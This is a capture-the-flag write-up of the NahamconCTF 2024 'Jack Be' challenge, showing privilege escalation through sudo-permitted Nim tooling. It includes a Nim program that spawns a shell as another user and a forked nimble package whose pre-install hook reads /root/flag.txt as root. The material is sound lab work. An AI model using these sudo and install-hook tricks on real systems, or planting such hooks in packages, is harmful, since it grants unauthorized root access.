---
title: 'NahamconCTF 2024 -Jack Be Miscellaneous '
description: 'CTF writeup'
pubDate: 'may 25 2024'
heroImage: '/hinata.jpeg'
pinned: false
---

> NahamconCTF 2024 - Miscellaneous

### Challenge name :Jack Be

```
Author: @JohnHammond
Wow! Jack is trying to learn one of the hottest new programming languages!!
And on top of that, he wants you to learn it too! He has given you access to his development box. So generous of him! He said, "just don't hack it, please."

Escalate your privileges and retrieve the contents of the /root/flag.txt file.

Connect with:
# Password is "userpass"
ssh -p 32589 user@challenge.nahamcon.com
```

- Connecting to the ssh to proceed with the challenge.

![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/nahamcon2024/initial.jpeg)

- We are currently `user` and we can run `(jack) NOPASSWD: /usr/bin/nimble run` as jack.

>Nim - Nim is a modern, high-performance, statically-typed compiled programming language that is designed for efficiency, expressiveness, and readability. It combines concepts from multiple programming paradigms including procedural, object-oriented, functional, and metaprogramming.

- Since we can run this programming lang as `jack` from `user`, we can try to import a package which helps to read system command.[like os in python]

- The idea is to create a package and make it excute `/bin/bash`[ which will land as `jack`]

ref: https://nim-lang.github.io/nimble/create-packages.html

> Nimble is the package manager for the Nim programming language. It facilitates the management of Nim libraries and applications by handling dependencies, installation, and distribution.

- With the above reference we can try to create a package and make a malicious nim file to execute command.

```
#main.nim

import osproc

proc main() =
    let command = "/bin/bash"
    let result = execCmd(command)
    echo result

when isMainModule:
    main()
```

- We first need to create a new project and we can name it `exploit`.

```
$ nimble init
      Info: Package initialisation requires info which could not be inferred.
        ... Default values are shown in square brackets, press
        ... enter to use them.
      Using "exploit" for new package name
      Using username for new package author
      Using "src" for new package source directory
    Prompt: Package type?
        ... Library - provides functionality for other packages.
        ... Binary  - produces an executable for the end-user.
        ... Hybrid  - combination of library and binary
        ... For more information see https://goo.gl/cm2RX5
     Select Cycle with 'Tab', 'Enter' when done
   Choices:> library <
             binary  
             hybrid  
```

```
.
├── exploit.nimble
├── src
│   ├── exploit
│   │   └── exploit.nim
│   └── main.nim
└── tests
    ├── config.nims
    └── test1.nim
```

```
user@jackbe:~/exploit$ cat exploit.nimble
# Package

version       = "0.1.0"
author        = "Anonymous"
description   = "A new awesome nimble package"
license       = "MIT"
srcDir        = "src"
bin           = @["main"]

# Dependencies

requires "nim >= 1.2.6"
```

- Your exploit.nimble file should like this above to add the submodule main to execute the command.

- Now the next step is to build - `nimble build` and run as `sudo -u jack /usr/bin/nimble run` to land in `jack` and also we should run `chmod 777 .`,so that the `jack` user can access the `user` user files.

![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/nahamcon2024/second.jpeg)

- No we got into jack!!!

```
jack@jackbe:/home/user/exploit$ sudo -l
User jack may run the following commands on jack-be-24883393153aa58c-6544847df5-h8x7k:
    (root) NOPASSWD: /usr/bin/nimble install *
```

- With jack, we can run `/usr/bin/nimble install *` as root! and thats our escalation point.

ref : https://nim-lang.github.io/nimble/use-packages.html

- We can either give `/usr/bin/nimble install <package name>` or give `/usr/bin/nimble install <githuburl>`

```
jack@jackbe:~$ cat learning_nim.md 
# Learning Nim

> written by Jack :)

---------------------

TODO:

- [] Learn Nim

NOTES:

Dependency downloads and connections have been giving me trouble.

1. I left `/etc/hosts` as world-writable as a temporary fix
2. I added networking capabilities to Python to host easy local dev servers

MORE TODO:

- Clean up the temporary fixes above LOL
```

- Jack also had the above file in his directory, but my method of solution does not need the above hints.

- I just need to fork a existing git package and make changes to exec command while installing.

- I made one :p ! - https://github.com/kabilan1290/test-repo-rce.nim/

```
#cmd.nimble

# Package

version       = "1.4.2"
author        = "Samantha Marshall"
description   = "interactive command prompt"
license       = "BSD 3-Clause"
srcDir        = "src"

skipDirs      = @["tests"]

# Dependencies

requires "nim >= 0.16.0"

# Hooks

# Exploit
before install:
  echo "Exploiting"
  exec "echo `whoami`"
  exec "cat /root/flag.txt"
```

- Running `sudo -u root /usr/bin/nimble install https://github.com/kabilan1290/test-repo-rce.nim`,before installation , it will read out the `flag` for us as `root`.

![Description](https://raw.githubusercontent.com/kabilan1290/astro-blog/master/public/nahamcon2024/flag.jpeg)


- Thanks for reading !